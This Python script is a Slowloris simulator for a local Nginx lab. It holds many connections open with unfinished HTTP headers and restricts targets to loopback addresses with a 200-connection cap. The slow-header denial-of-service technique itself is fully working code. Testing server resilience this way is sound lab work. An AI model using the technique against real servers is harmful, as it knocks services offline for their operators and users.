"""Local-only Slowloris simulator for the Nginx gateway lab.

Slowloris keeps HTTP request headers unfinished. This implementation is guarded
so it can only target loopback addresses in a local, authorized lab.
"""

from __future__ import annotations

import argparse
import random
import socket
import string
import sys
import time
from dataclasses import dataclass


ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}
MAX_CONNECTIONS = 200


@dataclass
class SlowConnection:
    sock: socket.socket
    index: int


def is_allowed_local_host(host: str) -> bool:
    return host.lower() in ALLOWED_HOSTS


def make_socket(host: str, port: int, timeout: float) -> socket.socket:
    family = socket.AF_INET6 if host == "::1" else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    return sock


def random_token(length: int = 8) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def send_initial_header(sock: socket.socket, host: str, path: str) -> None:
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: local-slowloris-lab/1.0\r\n"
        "Accept: */*\r\n"
        "Connection: keep-alive\r\n"
    )
    sock.sendall(request.encode("ascii"))


def send_keepalive_header(sock: socket.socket) -> None:
    header = f"X-Lab-{random_token(6)}: {random_token(12)}\r\n"
    sock.sendall(header.encode("ascii"))


def open_connection(index: int, host: str, port: int, path: str, timeout: float) -> SlowConnection | None:
    try:
        sock = make_socket(host, port, timeout)
        send_initial_header(sock, host, path)
        return SlowConnection(sock=sock, index=index)
    except OSError as exc:
        print(f"[warn] connection {index} failed: {exc}", flush=True)
        return None


def close_all(connections: list[SlowConnection]) -> None:
    for conn in connections:
        try:
            conn.sock.close()
        except OSError:
            pass


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run a local-only Slowloris simulation against Nginx."
    )
    parser.add_argument("--host", default="127.0.0.1", help="target host; loopback only")
    parser.add_argument("--port", default=8080, type=int, help="target port")
    parser.add_argument("--path", default="/", help="request path")
    parser.add_argument("--connections", default=30, type=int, help="slow connection count")
    parser.add_argument("--interval", default=10.0, type=float, help="seconds between header drips")
    parser.add_argument("--duration", default=60.0, type=float, help="total run time in seconds")
    parser.add_argument("--connect-timeout", default=5.0, type=float, help="socket connect timeout")
    return parser.parse_args()


def validate_args(args: argparse.Namespace) -> None:
    if not is_allowed_local_host(args.host):
        raise SystemExit(
            "Refusing to run: this lab tool only allows localhost, 127.0.0.1, or ::1."
        )
    if args.connections < 1:
        raise SystemExit("--connections must be at least 1.")
    if args.connections > MAX_CONNECTIONS:
        raise SystemExit(
            f"--connections is capped at {MAX_CONNECTIONS} for local safety."
        )
    if args.interval <= 0:
        raise SystemExit("--interval must be greater than 0.")
    if args.duration <= 0:
        raise SystemExit("--duration must be greater than 0.")
    if not args.path.startswith("/"):
        raise SystemExit("--path must start with '/'.")


def main() -> int:
    args = parse_args()
    validate_args(args)

    print("Local authorized lab only. Do not use this tool against external targets.", flush=True)
    print(
        f"Target: {args.host}:{args.port}, connections={args.connections}, "
        f"interval={args.interval}s, duration={args.duration}s",
        flush=True,
    )

    connections: list[SlowConnection] = []
    for index in range(args.connections):
        conn = open_connection(index, args.host, args.port, args.path, args.connect_timeout)
        if conn is not None:
            connections.append(conn)

    print(f"Opened {len(connections)} slow connections.", flush=True)
    if not connections:
        print("No connections opened. Is Nginx listening on the target port?", flush=True)
        return 2

    start = time.monotonic()
    round_no = 0
    try:
        while time.monotonic() - start < args.duration:
            round_no += 1
            alive: list[SlowConnection] = []
            failed = 0
            for conn in connections:
                try:
                    send_keepalive_header(conn.sock)
                    alive.append(conn)
                except OSError:
                    failed += 1

            connections = alive
            print(
                f"[round {round_no}] alive={len(connections)} failed_since_last_round={failed}",
                flush=True,
            )
            if not connections:
                print("All slow connections were closed by the server.", flush=True)
                break
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\nInterrupted by user.", flush=True)
    finally:
        close_all(connections)
        print("Closed local slow connections.", flush=True)

    return 0


if __name__ == "__main__":
    sys.exit(main())
